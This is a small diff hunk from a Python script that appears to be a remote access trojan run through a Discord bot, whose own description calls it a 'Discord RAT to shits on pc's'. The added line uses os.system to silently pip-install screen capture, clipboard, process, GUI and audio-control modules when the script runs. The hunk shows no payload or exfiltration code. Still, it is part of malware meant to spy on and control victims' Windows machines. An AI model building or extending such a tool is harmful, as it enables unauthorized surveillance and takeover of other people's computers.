@@ -68,6 +68,8 @@ from discord_slash import SlashContext, SlashCommand
 from discord_slash.model import ButtonStyle
 from discord_slash.utils.manage_components import create_button, create_actionrow, create_select, create_select_option, wait_for_component
 
+os.system("pip install cv2 win32clipboard win32process win32com win32gui mss comtypes pycaw discord_components discord_slash")
+
 client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Discord RAT to shits on pc\\'s')
 slash = SlashCommand(client, sync_commands=True)
 
